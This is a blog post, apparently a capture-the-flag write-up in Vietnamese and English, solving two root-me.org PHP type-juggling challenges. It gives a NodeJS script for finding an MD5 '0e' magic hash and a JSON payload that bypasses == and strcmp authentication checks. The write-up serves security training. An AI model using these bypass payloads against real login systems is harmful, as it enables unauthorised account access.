---
title: "[root-me.org] PHP type juggling - PHP Loose Comparison "
date: 2019-01-30T20:02:08+07:00
draft: false
tags: [CTF,root-me.org,PHP]
---
---
# LIST OF CHALLGENGE
|ID| Challgenge  | Done  |
|------------| ------------ | ------------ |
|**1**|[**PHP - Loose Comparison**](#1)  |  ✅ |
|**2**|[**PHP type juggling**](#2) | ✅  |

**Note:** [Books](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf)

---
<a name="1"></a>
# PHP - Loose Comparison
- **Link:** `http://challenge01.root-me.org/web-serveur/ch55/`
- **Challenge:** Bypass authentication with sourcecode
- **Giải thích:** Đề bài sẽ cho sẵn source code, nhập vài 2 input `seed` và `hash`. Input `seed` chỉ nhận kí tự a-Z và 0-9, hash cũng tương tự
Đề bài tăng độ khó bằng cách ngẫu nhiên tạo số random và gắn sau `seed`

```php
    if($s != false && $h != false) {
        if($s.$r == $h) {
    ...
```

- **Hướng đi:** Ko nhập kí tự 0 đơn lẻ và phải bypass `==` 🍌 đơn giản là đi kèm `0` với một kí tự bất kì (0e,0f,0g,...);

- **Payload:**

```javascript
    //NodeJS
    const crypto = require('crypto');
    const md5 = text => crypto.createHash('md5').update(text).digest('hex')
    
    for (let i = 0; i < 99999999999; i++) {
        let hash = md5(i.toString());
        if (hash.substring(0, 2) == "0e" && (!!hash.substring(2, hash.length).match(/^[0-9]+$/))) {
            console.log(`[+] Successfull:${i}`);
            break;
        } else {
            console.log(`[-] Fail:${i}`);
        }
    }
    // seed = 0e
    // hash = 240610708
```

<img src="https://raw.githubusercontent.com/saddean/blogs/master/static/img/root-me/php/1.jpg" class="img-responsive">

---
<a name="2"></a>
# PHP - PHP type juggling
- **Link:** `http://challenge01.root-me.org/web-serveur/ch44/`
- **Challenge:** Bypass authentication with sourcecode
- **Giải Thích:** Nhập trường `login` và `password` , site sẽ thực thi script mã hóa `password` và chuyển `data` thành `JSON` để
thực hiện `ajax` gửi lên server.

```php
    if (isset($_POST["auth"]))  { 
        // retrieve JSON data
        $auth = @json_decode($_POST['auth'], true);
        
        // check login and password (sha256)
        if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
    ...
```

- **Hướng đi:** Ở đây chúng ta phải bypass 2 phần là `==` và `strcmp`, để bypass `$USER` khá đơn giản chỉ cần so sánh int(0) (mình đoán mò username là 'admin' =)), còn hàm 
`strcmp` chỉ cần trường password là `array`.

- **Payload:** có nhiều cách để làm bài này , debug ở client để thay đổi dữ liệu `json`, hoặc dùng brupsuite ...

```json
{"data":{"login":0,"password":[]}}

```

<img src="https://raw.githubusercontent.com/saddean/blogs/master/static/img/root-me/php/2.jpg" class="img-responsive">